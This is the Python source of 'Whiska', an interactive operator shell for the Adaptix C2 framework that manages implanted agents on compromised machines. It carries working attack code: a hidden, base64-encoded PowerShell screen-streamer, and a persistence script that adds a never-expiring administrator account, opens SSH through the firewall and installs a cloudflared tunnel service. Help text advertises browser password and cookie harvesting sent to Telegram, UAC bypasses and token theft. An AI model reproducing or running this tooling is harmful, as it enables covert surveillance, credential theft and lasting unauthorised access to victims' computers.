"""Interactive CLI shell for Adaptix C2."""
from __future__ import annotations

import base64
import datetime
import os
import shlex
import sys
import time
from typing import Optional

from prompt_toolkit import PromptSession
from prompt_toolkit.completion import WordCompleter
from prompt_toolkit.history import FileHistory
from prompt_toolkit.formatted_text import HTML
from prompt_toolkit.patch_stdout import patch_stdout
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.text import Text
from rich import box

from .client import AdaptixClient
from .config import get as cfg_get, load_config, save_config
from .decoder import (
    parse_master_keys, decode_passwords, decode_cookies,
    format_passwords_txt, format_cookies_txt, format_cookies_json,
    BROWSER_FILE_PREFIX, BrowserKeys,
)
from .models import (
    OS_NAMES, DOWNLOAD_STATE_NAMES,
    TYPE_AGENT_CONSOLE_OUT, TYPE_AGENT_CONSOLE_ERROR, TYPE_AGENT_CONSOLE_LOCAL,
)

console = Console()


def ts_to_str(ts: int) -> str:
    """Convert unix timestamp to local time string."""
    if ts == 0:
        return "-"
    try:
        return datetime.datetime.fromtimestamp(ts).strftime("%Y-%m-%d %H:%M:%S")
    except Exception:
        return str(ts)


class AdaptixShell:
    """Interactive command-line shell for Adaptix C2."""

    # Toplevel commands
    MAIN_COMMANDS = [
        "help", "listeners", "agents", "sessions", "interact", "use",
        "tasks", "downloads", "download", "upload",
        "creds", "targets", "tunnels", "pivots", "screenshots",
        "chat", "services", "extenders", "generate", "subscribe",
        "remove", "info", "note", "sleep", "jitter",
        "config", "exit", "quit", "clear",
    ]

    # Commands available inside agent interaction
    INTERACT_COMMANDS = [
        "help", "shell", "cmd", "exec", "run",
        "back", "exit",
        "tasks", "task_cancel", "task_delete",
        "info", "tag", "mark", "color",
        "upload", "download",
        "sleep", "jitter",
        "commands", "stream", "persist", "remove",
        "harvest", "elevate",
        "socks5", "socks4", "lportfwd", "rportfwd",
        "clear", "history",
    ]

    def __init__(self, client: AdaptixClient):
        self.client = client
        self.current_agent_id: Optional[str] = None
        self._running = True

        # Register callbacks
        self.client.on_console_output = self._handle_console_output
        self.client.on_task_update = self._handle_task_update
        self.client.on_notification = self._handle_notification
        self.client.on_chat = self._handle_chat
        self.client.on_agent_event = self._handle_agent_event
        self.client.on_disconnect = self._handle_disconnect
        self.client.on_reconnect = self._handle_reconnect

        # History file
        hist_dir = os.path.expanduser("~/.whiskacli")
        os.makedirs(hist_dir, exist_ok=True)
        self._history = FileHistory(os.path.join(hist_dir, "history"))

    _BANNER = r"""
[bold cyan] █     █░ ██░ ██  ██▓  ██████  ██ ▄█▀ ▄▄▄
▓█░ █ ░█░▓██░ ██▒▓██▒▒██    ▒ ██▄█▒ ▒████▄
▒█░ █ ░█ ▒██▀▀██░▒██▒░ ▓██▄  ▓███▄░ ▒██  ▀█▄
░█░ █ ░█ ░▓█ ░██ ░██░  ▒   ██▒▓██ █▄░██▄▄▄▄██
░░██▒██▓ ░▓█▒░██▓░██░▒██████▒▒▒██▒ █▄▓█   ▓██▒
░ ▓░▒ ▒   ▒ ░░▒░▒░▓  ▒ ▒▓▒ ▒ ░▒ ▒▒ ▓▒▒▒   ▓▒█░[/bold cyan]
"""

    def run(self):
        """Main REPL loop."""
        console.print(self._BANNER)
        console.print(
            f"  Connected as [bold]{self.client.username}[/bold] "
            f"to [bold]{self.client.host}:{self.client.port}[/bold]\n"
            f"  Agents: [green]{len(self.client.agents)}[/green] | "
            f"Listeners: [green]{len(self.client.listeners)}[/green]\n",
            highlight=False,
        )

        session = PromptSession(history=self._history)

        with patch_stdout(raw=True):
            console.file = sys.stdout
            while self._running:
                try:
                    prompt = self._get_prompt()
                    completer = self._get_completer()
                    line = session.prompt(prompt, completer=completer).strip()
                    if not line:
                        continue
                    self._dispatch(line)
                except KeyboardInterrupt:
                    continue
                except EOFError:
                    self._running = False
                    break
                except Exception as e:
                    console.print(f"[red]Error: {e}[/red]")

    def _get_prompt(self) -> HTML:
        if self.current_agent_id:
            agent = self.client.agents.get(self.current_agent_id)
            if agent:
                label = f"{agent.computer}/{agent.username}"
                return HTML(f"<ansicyan>whiska</ansicyan>(<ansigreen>{label}</ansigreen>)> ")
            return HTML(f"<ansicyan>whiska</ansicyan>(<ansired>{self.current_agent_id[:8]}</ansired>)> ")
        return HTML("<ansicyan>whiska</ansicyan>> ")

    def _get_completer(self) -> WordCompleter:
        if self.current_agent_id:
            words = list(self.INTERACT_COMMANDS)
        else:
            words = list(self.MAIN_COMMANDS)
            # Add agent IDs and short IDs for quick interact
            for aid in self.client.agents:
                words.append(aid)
                words.append(aid[:8])
        return WordCompleter(words, ignore_case=True)

    def _dispatch(self, line: str):
        """Route command to handler."""
        try:
            parts = shlex.split(line)
        except ValueError:
            parts = line.split()

        if not parts:
            return

        cmd = parts[0].lower()
        args = parts[1:]

        # If interacting with agent, route differently
        if self.current_agent_id:
            self._dispatch_interact(cmd, args, line)
        else:
            self._dispatch_main(cmd, args, line)

    # ─── Main dispatch ────────────────────────────────────────────────

    def _dispatch_main(self, cmd: str, args: list[str], line: str):
        handlers = {
            "help": self._cmd_help,
            "listeners": self._cmd_listeners,
            "agents": self._cmd_agents,
            "sessions": self._cmd_agents,
            "interact": self._cmd_interact,
            "use": self._cmd_interact,
            "tasks": self._cmd_tasks,
            "downloads": self._cmd_downloads,
            "download": self._cmd_download_file,
            "creds": self._cmd_creds,
            "targets": self._cmd_targets,
            "tunnels": self._cmd_tunnels,
            "screenshots": self._cmd_screenshots,
            "chat": self._cmd_chat,
            "services": self._cmd_services,
            "extenders": self._cmd_extenders,
            "generate": self._cmd_generate,
            "subscribe": self._cmd_subscribe,
            "remove": self._cmd_remove,
            "info": self._cmd_info,
            "note": self._cmd_note,
            "sleep": self._cmd_sleep,
            "jitter": self._cmd_jitter,
            "upload": self._cmd_upload,
            "pivots": self._cmd_pivots,
            "config": self._cmd_config,
            "clear": lambda a, l: os.system("clear"),
            "exit": lambda a, l: self._do_exit(),
            "quit": lambda a, l: self._do_exit(),
        }

        handler = handlers.get(cmd)
        if handler:
            handler(args, line)
        else:
            # Try matching as agent ID shortcut
            match = self._find_agent(cmd)
            if match:
                self.current_agent_id = match.id
                console.print(f"[green]Interacting with {match.computer}/{match.username} ({match.id[:8]})[/green]")
            else:
                console.print(f"[yellow]Unknown command: {cmd}. Type 'help' for commands.[/yellow]")

    # ─── Interact dispatch ────────────────────────────────────────────

    def _dispatch_interact(self, cmd: str, args: list[str], line: str):
        if cmd in ("back", "exit"):
            self.current_agent_id = None
            return

        if cmd == "help":
            self._cmd_interact_help(args, line)
            return

        if cmd == "info":
            self._cmd_agent_info(args, line)
            return

        if cmd == "tasks":
            self._cmd_agent_tasks(args, line)
            return

        if cmd == "task_cancel":
            if args:
                try:
                    self.client.task_cancel(self.current_agent_id, args)
                    console.print("[green]Task(s) cancelled[/green]")
                except Exception as e:
                    console.print(f"[red]{e}[/red]")
            else:
                console.print("[yellow]Usage: task_cancel <task_id> [task_id...][/yellow]")
            return

        if cmd == "task_delete":
            if args:
                try:
                    self.client.task_delete(self.current_agent_id, args)
                    console.print("[green]Task(s) deleted[/green]")
                except Exception as e:
                    console.print(f"[red]{e}[/red]")
            else:
                console.print("[yellow]Usage: task_delete <task_id> [task_id...][/yellow]")
            return

        if cmd == "tag":
            tag = " ".join(args) if args else ""
            try:
                self.client.agent_set_tag([self.current_agent_id], tag)
                console.print(f"[green]Tag set: {tag or '(cleared)'}[/green]")
            except Exception as e:
                console.print(f"[red]{e}[/red]")
            return

        if cmd == "mark":
            mark = " ".join(args) if args else ""
            try:
                self.client.agent_set_mark([self.current_agent_id], mark)
                console.print(f"[green]Mark set: {mark or '(cleared)'}[/green]")
            except Exception as e:
                console.print(f"[red]{e}[/red]")
            return

        if cmd == "remove":
            try:
                self.client.agent_remove([self.current_agent_id])
                console.print(f"[green]Agent {self.current_agent_id[:8]} removed[/green]")
                self.current_agent_id = None
            except Exception as e:
                console.print(f"[red]{e}[/red]")
            return

        if cmd == "sleep":
            self._cmd_agent_sleep(args, line)
            return

        if cmd == "jitter":
            self._cmd_agent_jitter(args, line)
            return

        if cmd == "color":
            self._cmd_agent_color(args, line)
            return

        if cmd == "upload":
            self._cmd_agent_upload(args, line)
            return

        if cmd == "download":
            self._cmd_agent_download(args, line)
            return

        if cmd == "commands":
            self._cmd_agent_commands(args, line)
            return

        if cmd == "stream":
            self._cmd_stream(args, line)
            return

        if cmd == "persist":
            self._cmd_persist(args, line)
            return

        if cmd == "harvest":
            self._cmd_harvest(args, line)
            return

        if cmd == "elevate":
            self._cmd_elevate(args, line)
            return

        if cmd == "clear":
            os.system("clear")
            return

        if cmd == "history":
            lines = list(self._history.load_history_strings())
            if not lines:
                console.print("[dim]No history[/dim]")
                return
            recent = lines[-50:]
            for i, entry in enumerate(recent, max(1, len(lines) - 49)):
                console.print(f"[dim]{i:4}[/dim]  {entry}")
            return

        if cmd in ("socks5", "socks4", "lportfwd", "rportfwd"):
            self._cmd_interact_tunnel(cmd, args, line)
            return

        # Everything else → send as raw command to agent
        try:
            self.client.agent_command_raw(self.current_agent_id, line)
        except Exception as e:
            console.print(f"[red]Command error: {e}[/red]")

    # ─── Command handlers ─────────────────────────────────────────────

    def _cmd_help(self, args, line):
        t = Table(title="Whiska Commands", box=box.SIMPLE_HEAVY, show_lines=False)
        t.add_column("Command", style="cyan", no_wrap=True)
        t.add_column("Description")
        t.add_row("listeners [create|stop|pause|resume ...]", "List/manage listeners")
        t.add_row("agents / sessions", "List agent sessions")
        t.add_row("interact <id>", "Interact with an agent")
        t.add_row("tasks <agent_id>", "List tasks for an agent")
        t.add_row("downloads", "List downloaded files")
        t.add_row("download <file_id>", "Save a downloaded file locally")
        t.add_row("creds", "List credentials")
        t.add_row("targets", "List targets")
        t.add_row("tunnels [start|stop ...]", "List tunnels, or start/stop one")
        t.add_row("pivots", "List pivot connections")
        t.add_row("screenshots", "List screenshots")
        t.add_row("chat <message>", "Send team chat message")
        t.add_row("upload <file> <agent> <remote>", "Upload local file to agent")
        t.add_row("services [call|config]", "Services: list, call, config")
        t.add_row("extenders", "Show loaded extenders")
        t.add_row("generate", "Generate payload (interactive wizard)")
        t.add_row("subscribe [list|add|remove]", "Manage WebSocket subscriptions")
        t.add_row("remove <id> / --older / --dead", "Remove agent(s) by ID, age, or status")
        t.add_row("info <agent_id>", "Show agent details")
        t.add_row("note <agent_id> [text]", "Set agent note/mark")
        t.add_row("sleep <agent_id> <secs>", "Set agent sleep interval")
        t.add_row("jitter <agent_id> <pct>", "Set agent jitter percentage")
        t.add_row("config [show]", "Show persistent settings")
        t.add_row("config set <key> <value>", "Save setting (e.g. tg_token, tg_chat)")
        t.add_row("clear", "Clear screen")
        t.add_row("exit / quit", "Disconnect and exit")
        console.print(t)

    def _cmd_interact_help(self, args, line):
        t = Table(title="Agent Interaction Commands", box=box.SIMPLE_HEAVY)
        t.add_column("Command", style="cyan", no_wrap=True)
        t.add_column("Description")
        t.add_row("<any command>", "Sent as raw command to agent (server parses)")
        t.add_row("commands", "List available agent commands")
        t.add_row("upload <local> <remote>", "Upload local file to agent")
        t.add_row("download <remote_path>", "Download file from agent")
        t.add_row("harvest [browser|all] [--decode]", "Grab & decode passwords/cookies → Telegram")
        t.add_row("stream [port] [quality]", "Deploy screen streamer on target")
        t.add_row("socks5 <lport> [--desc text]", "Start SOCKS5 tunnel via this agent")
        t.add_row("socks4 <lport> [--desc text]", "Start SOCKS4 tunnel via this agent")
        t.add_row("lportfwd <lport> <thost> <tport>", "Local port forward via this agent")
        t.add_row("rportfwd <port> <thost> <tport>", "Reverse port forward via this agent")
        t.add_row("persist ssh [user] [pass] [cf_token]", "Deploy SSH + cloudflared (auto-elevates via RunAs)")
        t.add_row("elevate", "Show elevation/privesc techniques")
        t.add_row("elevate getsystem", "Escalate to SYSTEM (BOF token impersonation)")
        t.add_row("elevate uac <technique> <cmd>", "UAC bypass (runas/cmstp/mockdir/sspi/regshell)")
        t.add_row("elevate potato dcom", "DCOMPotato SYSTEM escalation (BOF)")
        t.add_row("elevate token steal <pid>", "Steal token from process (BOF)")
        t.add_row("elevate token make ...", "Create token from creds (BOF)")
        t.add_row("elevate runas ...", "Run as another user (BOF)")
        t.add_row("sleep <seconds>", "Set agent sleep interval")
        t.add_row("jitter <0-100>", "Set agent jitter percentage")
        t.add_row("remove", "Remove this agent")
        t.add_row("info", "Show agent info")
        t.add_row("tasks", "List agent tasks")
        t.add_row("task_cancel <id>", "Cancel a task")
        t.add_row("task_delete <id>", "Delete a task")
        t.add_row("tag <text>", "Set agent tag")
        t.add_row("mark <text>", "Set agent mark")
        t.add_row("color <bg> [fg] | reset", "Set agent highlight color")
        t.add_row("back / exit", "Return to main menu")
        console.print(t)
        console.print("[dim]Any unrecognized command is sent directly to the agent.[/dim]")

    def _cmd_listeners(self, args, line):
        if not args:
            self._listeners_list()
            return

        sub = args[0].lower()

        if sub == "create":
            # listeners create <name> <type> [config_json]
            if len(args) < 3:
                console.print("[yellow]Usage: listeners create <name> <type> [config_json][/yellow]")
                console.print("[dim]  config_json: JSON string of listener config (type-specific)[/dim]")
                console.print(f"[dim]  Available types: {', '.join(self.client.listener_regs.keys()) or '(none)'}[/dim]")
                return
            name, ltype = args[1], args[2]
            config_str = " ".join(args[3:]) if len(args) > 3 else "{}"
            try:
                self.client.listener_start(name, ltype, config_str)
                console.print(f"[green]Listener '{name}' ({ltype}) started[/green]")
            except Exception as e:
                console.print(f"[red]{e}[/red]")

        elif sub == "stop":
            if len(args) < 3:
                console.print("[yellow]Usage: listeners stop <name> <type>[/yellow]")
                return
            name, ltype = args[1], args[2]
            try:
                self.client.listener_stop(name, ltype)
                console.print(f"[green]Listener '{name}' stopped[/green]")
            except Exception as e:
                console.print(f"[red]{e}[/red]")

        elif sub == "pause":
            if len(args) < 3:
                console.print("[yellow]Usage: listeners pause <name> <type>[/yellow]")
                return
            name, ltype = args[1], args[2]
            try:
                self.client.listener_pause(name, ltype)
                console.print(f"[yellow]Listener '{name}' paused[/yellow]")
            except Exception as e:
                console.print(f"[red]{e}[/red]")

        elif sub == "resume":
            if len(args) < 3:
                console.print("[yellow]Usage: listeners resume <name> <type>[/yellow]")
                return
            name, ltype = args[1], args[2]
            try:
                self.client.listener_resume(name, ltype)
                console.print(f"[green]Listener '{name}' resumed[/green]")
            except Exception as e:
                console.print(f"[red]{e}[/red]")

        else:
            console.print(f"[yellow]Unknown subcommand: {sub}. Use: create / stop / pause / resume[/yellow]")

    def _listeners_list(self):
        t = Table(title="Listeners", box=box.ROUNDED)
        t.add_column("Name", style="cyan")
        t.add_column("Type")
        t.add_column("Protocol")
        t.add_column("Bind")
        t.add_column("Agent Addr")
        t.add_column("Status")
        t.add_column("Created")

        for li in self.client.listeners.values():
            status_style = "green" if li.status == "running" else "yellow" if li.status == "paused" else "red"
            t.add_row(
                li.name, li.l_type, li.protocol,
                f"{li.bind_host}:{li.bind_port}",
                li.agent_addr,
                f"[{status_style}]{li.status}[/{status_style}]",
                ts_to_str(li.create_time),
            )

        if not self.client.listeners:
            console.print("[dim]No active listeners[/dim]")
        else:
            console.print(t)

        if self.client.listener_regs:
            console.print(f"[dim]Registered types: {', '.join(self.client.listener_regs.keys())}[/dim]")
        console.print("[dim]Subcommands: listeners create <name> <type> [cfg_json] | stop <name> <type> | pause | resume[/dim]")

    def _cmd_agents(self, args, line):
        t = Table(title="Agent Sessions", box=box.SIMPLE_HEAVY, expand=True, padding=(0, 1))
        t.add_column("ID", style="cyan", no_wrap=True, width=8)
        t.add_column("User@Computer", no_wrap=False, ratio=3)
        t.add_column("IP", no_wrap=False, ratio=2, min_width=13)
        t.add_column("OS/Arch", no_wrap=True, width=10)
        t.add_column("PID", no_wrap=True, width=6, justify="right")
        t.add_column("Sleep", no_wrap=True, width=7)
        t.add_column("Last", no_wrap=True, width=8)

        for agent in sorted(self.client.agents.values(), key=lambda a: a.last_tick, reverse=True):
            diff = int(time.time()) - agent.last_tick if agent.last_tick else 99999
            if diff < agent.sleep * 3 + 30:
                id_style = "green"
            elif diff < agent.sleep * 10 + 60:
                id_style = "yellow"
            else:
                id_style = "red"

            user = agent.username
            if agent.elevated:
                user = f"[bold red]{user}*[/bold red]"
            user_comp = f"{user}@{agent.computer}"

            ip = agent.internal_ip
            if agent.external_ip and agent.external_ip != "[":
                ip += f"\n{agent.external_ip}"

            t.add_row(
                f"[{id_style}]{agent.id[:8]}[/{id_style}]",
                user_comp,
                ip,
                f"{agent.arch}",
                agent.pid,
                f"{agent.sleep}s/{agent.jitter}%",
                agent.last_seen_ago,
            )

        if not self.client.agents:
            console.print("[dim]No agents[/dim]")
        else:
            console.print(t)
            console.print(f"[dim]Total: {len(self.client.agents)} agent(s)[/dim]")

    @staticmethod
    def _parse_duration(s: str) -> int | None:
        """Parse duration like '12h', '30m', '1d', '2d12h' to seconds."""
        import re
        total = 0
        for val, unit in re.findall(r'(\d+)\s*([dhms])', s.lower()):
            n = int(val)
            if unit == 'd': total += n * 86400
            elif unit == 'h': total += n * 3600
            elif unit == 'm': total += n * 60
            elif unit == 's': total += n
        return total if total > 0 else None

    def _cmd_remove(self, args, line):
        if not args:
            console.print("[yellow]Usage: remove <agent_id> [agent_id...][/yellow]")
            console.print("[dim]       remove --older 12h   (remove all agents last seen > 12h ago)[/dim]")
            console.print("[dim]       remove --dead        (remove all dead/inactive agents)[/dim]")
            return

        removed = []

        if args[0] == "--older" and len(args) > 1:
            dur = self._parse_duration(args[1])
            if not dur:
                console.print("[red]Invalid duration. Examples: 12h, 1d, 30m, 2d12h[/red]")
                return
            now = int(time.time())
            for agent in self.client.agents.values():
                diff = now - agent.last_tick if agent.last_tick else 999999
                if diff > dur:
                    removed.append(agent.id)
            if not removed:
                console.print(f"[dim]No agents older than {args[1]}[/dim]")
                return
            console.print(f"[yellow]Removing {len(removed)} agent(s) last seen > {args[1]} ago...[/yellow]")

        elif args[0] == "--dead":
            now = int(time.time())
            for agent in self.client.agents.values():
                diff = now - agent.last_tick if agent.last_tick else 999999
                threshold = max(agent.sleep * 10 + 60, 300)
                if diff > threshold:
                    removed.append(agent.id)
            if not removed:
                console.print("[dim]No dead agents[/dim]")
                return
            console.print(f"[yellow]Removing {len(removed)} dead agent(s)...[/yellow]")

        else:
            for aid in args:
                match = self._find_agent(aid)
                if match:
                    removed.append(match.id)
                else:
                    console.print(f"[red]Agent not found: {aid}[/red]")

        if removed:
            try:
                self.client.agent_remove(removed)
                for rid in removed:
                    console.print(f"[green]Removed: {rid[:8]}[/green]")
            except Exception as e:
                console.print(f"[red]{e}[/red]")

    def _cmd_interact(self, args, line):
        if not args:
            console.print("[yellow]Usage: interact <agent_id or partial_id>[/yellow]")
            return

        match = self._find_agent(args[0])
        if match:
            self.current_agent_id = match.id
            console.print(f"[green]Interacting with {match.computer}/{match.username} ({match.id[:8]})[/green]")
            console.print(f"[dim]  OS: {match.os_name} | PID: {match.pid} | Arch: {match.arch} | "
                          f"Sleep: {match.sleep}s | Last: {match.last_seen_ago}[/dim]")
        else:
            console.print(f"[red]Agent not found: {args[0]}[/red]")

    def _cmd_info(self, args, line):
        if args:
            match = self._find_agent(args[0])
        elif self.current_agent_id:
            match = self.client.agents.get(self.current_agent_id)
        else:
            console.print("[yellow]Usage: info <agent_id>[/yellow]")
            return

        if not match:
            console.print("[red]Agent not found[/red]")
            return

        self._print_agent_detail(match)

    def _cmd_agent_info(self, args, line):
        agent = self.client.agents.get(self.current_agent_id)
        if agent:
            self._print_agent_detail(agent)
        else:
            console.print("[red]Agent not found in local state[/red]")

    def _print_agent_detail(self, a):
        t = Table(box=box.SIMPLE, show_header=False, padding=(0, 2))
        t.add_column("Field", style="cyan")
        t.add_column("Value")

        t.add_row("ID", a.id)
        t.add_row("Name", a.name)
        t.add_row("Listener", a.listener)
        t.add_row("Computer", a.computer)
        t.add_row("Domain", a.domain)
        t.add_row("Username", a.display_user)
        t.add_row("OS", f"{a.os_name} - {a.os_desc}")
        t.add_row("Arch", a.arch)
        t.add_row("PID / TID", f"{a.pid} / {a.tid}")
        t.add_row("Process", a.process)
        t.add_row("Internal IP", a.internal_ip)
        t.add_row("External IP", a.external_ip)
        t.add_row("Sleep / Jitter", f"{a.sleep}s / {a.jitter}%")
        t.add_row("Last Seen", f"{a.last_seen_ago} ({ts_to_str(a.last_tick)})")
        t.add_row("Created", ts_to_str(a.create_time))
        t.add_row("Tags", a.tags or "-")
        t.add_row("Mark", a.mark or "-")
        if a.kill_date:
            t.add_row("Kill Date", ts_to_str(a.kill_date))
        if a.working_time:
            t.add_row("Working Time", str(a.working_time))

        console.print(Panel(t, title=f"Agent {a.id[:8]}", border_style="cyan"))

    def _cmd_agent_commands(self, args, line):
        agent = self.client.agents.get(self.current_agent_id)
        if not agent:
            console.print("[red]Agent not found[/red]")
            return
        cmds = self.client.get_agent_commands(agent.name)
        if not cmds:
            console.print("[dim]No command info available for this agent type[/dim]")
            return

        t = Table(title=f"Available Commands ({agent.name})", box=box.ROUNDED)
        t.add_column("Command", style="cyan", no_wrap=True)
        t.add_column("Description")
        t.add_column("Example", style="dim")

        for cmd in cmds:
            subs = cmd.get("subcommands", [])
            if subs:
                t.add_row(cmd["name"], cmd["description"], "")
                for sub in subs:
                    t.add_row(
                        f"  {cmd['name']} {sub['name']}",
                        sub["description"],
                        sub.get("example", ""),
                    )
            else:
                t.add_row(cmd["name"], cmd["description"], cmd.get("example", ""))

        console.print(t)

    # PowerShell screen streamer — uses .NET, zero dependencies on target
    _STREAM_PS1 = r'''
Add-Type -AssemblyName System.Drawing
Add-Type -AssemblyName System.Windows.Forms
$port = __PORT__
$q = __QUALITY__
$listener = [System.Net.HttpListener]::new()
$listener.Prefixes.Add("http://+:$port/")
$listener.Start()
$html = '<!doctype html><html><head><title>Screen</title><style>html,body{margin:0;background:#000;overflow:hidden;height:100%}img{width:100vw;height:100vh;object-fit:contain}</style></head><body><img id="s"><script>const img=document.getElementById("s");function t(){const n=new Image();n.onload=()=>{img.src=n.src;setTimeout(t,66)};n.onerror=()=>setTimeout(t,300);n.src="/frame.jpg?t="+Date.now()}t();</script></body></html>'
$enc = [System.Drawing.Imaging.ImageCodecInfo]::GetImageEncoders() | Where-Object { $_.MimeType -eq 'image/jpeg' }
$ep = [System.Drawing.Imaging.EncoderParameters]::new(1)
$ep.Param[0] = [System.Drawing.Imaging.EncoderParameter]::new([System.Drawing.Imaging.Encoder]::Quality, [long]$q)
while($true) {
  $ctx = $listener.GetContext()
  $resp = $ctx.Response
  try {
    if($ctx.Request.Url.AbsolutePath -eq '/frame.jpg') {
      $bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
      $bmp = [System.Drawing.Bitmap]::new($bounds.Width, $bounds.Height)
      $g = [System.Drawing.Graphics]::FromImage($bmp)
      $g.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size)
      $g.Dispose()
      $ms = [System.IO.MemoryStream]::new()
      $bmp.Save($ms, $enc, $ep)
      $bmp.Dispose()
      $bytes = $ms.ToArray()
      $ms.Dispose()
      $resp.ContentType = 'image/jpeg'
      $resp.Headers.Add('Cache-Control','no-store')
      $resp.ContentLength64 = $bytes.Length
      $resp.OutputStream.Write($bytes, 0, $bytes.Length)
    } else {
      $bytes = [System.Text.Encoding]::UTF8.GetBytes($html)
      $resp.ContentType = 'text/html'
      $resp.ContentLength64 = $bytes.Length
      $resp.OutputStream.Write($bytes, 0, $bytes.Length)
    }
  } catch {} finally { $resp.Close() }
}
'''

    def _cmd_stream(self, args, line):
        """Deploy screen streamer on target via PowerShell."""
        port = 7135
        quality = 65
        if args:
            try:
                port = int(args[0])
            except ValueError:
                console.print("[yellow]Usage: stream [port] [quality][/yellow]")
                console.print("[dim]  port: HTTP port on target (default 7135)[/dim]")
                console.print("[dim]  quality: JPEG quality 1-100 (default 65)[/dim]")
                return
        if len(args) > 1:
            try:
                quality = max(1, min(100, int(args[1])))
            except ValueError:
                pass

        agent = self.client.agents.get(self.current_agent_id)
        if not agent:
            console.print("[red]Agent not found[/red]")
            return

        # Build PowerShell script
        ps_script = self._STREAM_PS1.replace("__PORT__", str(port)).replace("__QUALITY__", str(quality))

        # Encode for powershell -EncodedCommand (UTF-16LE base64)
        ps_bytes = ps_script.encode("utf-16-le")
        ps_b64 = base64.b64encode(ps_bytes).decode("ascii")

        # Use ps run to launch in background (won't block the agent)
        cmd = f'ps run powershell.exe -WindowStyle Hidden -EncodedCommand {ps_b64}'

        console.print(f"[dim]Deploying screen streamer on port {port} (quality {quality})...[/dim]")
        try:
            self.client.agent_command_raw(self.current_agent_id, cmd)
            console.print(f"[green]Stream command sent. Target will listen on port {port}[/green]")
            console.print(f"[dim]Use 'lportfwd start 127.0.0.1 {port} 127.0.0.1 {port}' to forward, then open http://127.0.0.1:{port}[/dim]")
        except Exception as e:
            console.print(f"[red]Failed: {e}[/red]")

    _PERSIST_SSH_PS1 = r'''
$ErrorActionPreference = "Continue"
$dl = "C:\Users\Public"
$user = "__USER__"
$pass = "__PASS__"
$cfToken = "__CF_TOKEN__"

Write-Host "[*] Step 1/7: Creating user $user..."
net user $user $pass /add /y 2>&1 | Out-Null

# Add to Administrators
net localgroup Administrators $user /add 2>&1 | Out-Null
Add-LocalGroupMember -Group "Administrators" -Member $user -ErrorAction SilentlyContinue

# Password never expires (Set-LocalUser = modern; wmic = fallback for older Windows)
Set-LocalUser -Name $user -PasswordNeverExpires $true -ErrorAction SilentlyContinue
wmic useraccount where "name='$user'" set PasswordExpires=FALSE 2>&1 | Out-Null

# Account never expires
net user $user /expires:never 2>&1 | Out-Null

Write-Host "[+] User $user created (Administrators, password never expires)"

Write-Host "[*] Step 2/7: Installing OpenSSH Server..."
$cap = Get-WindowsCapability -Online -ErrorAction SilentlyContinue | Where-Object Name -like "OpenSSH.Server*"
if ($cap -and $cap.State -ne "Installed") {
    Add-WindowsCapability -Online -Name "OpenSSH.Server~~~~0.0.1.0" -ErrorAction SilentlyContinue 2>&1 | Out-Null
    Write-Host "[+] OpenSSH Server installed via DISM"
} elseif ($cap -and $cap.State -eq "Installed") {
    Write-Host "[+] OpenSSH Server already installed"
} else {
    Write-Host "[*] Capability not found, trying MSI fallback..."
    try {
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
        Invoke-WebRequest -Uri "https://github.com/PowerShell/Win32-OpenSSH/releases/latest/download/OpenSSH-Win64-v9.8.1.0.msi" -OutFile "$dl\OpenSSH.msi" -UseBasicParsing
        Start-Process msiexec.exe -ArgumentList "/i `"$dl\OpenSSH.msi`" /qn" -Wait -NoNewWindow
        Start-Sleep -Seconds 5
        Write-Host "[+] OpenSSH installed via MSI"
    } catch { Write-Host "[-] OpenSSH install failed: $_" }
}

Write-Host "[*] Step 3/7: Configuring sshd..."
$sshDir = "C:\ProgramData\ssh"
if (-not (Test-Path $sshDir)) { New-Item -ItemType Directory -Path $sshDir -Force | Out-Null }
@"
Port 22
PasswordAuthentication yes
PubkeyAuthentication yes
PermitEmptyPasswords no
"@ | Set-Content "$sshDir\sshd_config" -Force
Write-Host "[+] sshd_config written"

Write-Host "[*] Step 4/7: Starting sshd..."
Start-Service sshd -ErrorAction SilentlyContinue
Set-Service -Name sshd -StartupType Automatic -ErrorAction SilentlyContinue
Start-Service ssh-agent -ErrorAction SilentlyContinue
Set-Service -Name ssh-agent -StartupType Automatic -ErrorAction SilentlyContinue
Write-Host "[+] sshd + ssh-agent started (auto-start)"

Write-Host "[*] Step 5/7: Firewall rule..."
New-NetFirewallRule -Name "OpenSSH-Server" -DisplayName "OpenSSH Server (sshd)" -Direction Inbound -Protocol TCP -LocalPort 22 -Action Allow -ErrorAction SilentlyContinue 2>&1 | Out-Null
Write-Host "[+] Firewall rule added"

Write-Host "[*] Step 6/7: Cloudflared..."
if ($cfToken) {
    $cfPath = "$dl\cloudflared.exe"
    if (-not (Test-Path $cfPath)) {
        try {
            [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
            Invoke-WebRequest -Uri "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe" -OutFile $cfPath -UseBasicParsing
            Write-Host "[+] cloudflared downloaded"
        } catch { Write-Host "[-] cloudflared download failed: $_" }
    } else {
        Write-Host "[+] cloudflared already exists"
    }
    if (Test-Path $cfPath) {
        $out = & $cfPath service install $cfToken 2>&1
        Write-Host "[+] cloudflared service: $out"
    }
} else {
    Write-Host "[*] No cf_token — skipping cloudflared"
}

Write-Host "[*] Step 7/7: Verifying..."
$svc = Get-Service sshd -ErrorAction SilentlyContinue
Write-Host "[*] sshd: $($svc.Status)"
$cfsvc = Get-Service cloudflared -ErrorAction SilentlyContinue
if ($cfsvc) { Write-Host "[*] cloudflared: $($cfsvc.Status)" }
netstat -an | findstr ":22 "
$u = net user $user 2>&1
if ($u -match "User name") { Write-Host "[+] User $user exists" }
Write-Host "[+] DONE - Credentials: $user / $pass"
'''

    def _cmd_persist(self, args, line):
        """Deploy persistence mechanisms on target."""
        if not args or args[0] != "ssh":
            console.print("[yellow]Usage: persist ssh [username] [password] [cf_token][/yellow]")
            console.print("[dim]  Deploy OpenSSH server + cloudflared tunnel on target Windows[/dim]")
            console.print("[dim]  Creates admin user, installs/starts sshd, opens port 22[/dim]")
            console.print("[dim]  If cf_token is provided, installs cloudflared as a Windows service[/dim]")
            console.print()
            console.print("[dim]  Arguments:[/dim]")
            console.print("[dim]    username   SSH username to create (default: default)[/dim]")
            console.print("[dim]    password   SSH password (default: Pass123)[/dim]")
            console.print("[dim]    cf_token   Cloudflare Tunnel service token (from dashboard)[/dim]")
            console.print()
            console.print("[dim]  If agent is not elevated, auto-elevates via Start-Process -Verb RunAs[/dim]")
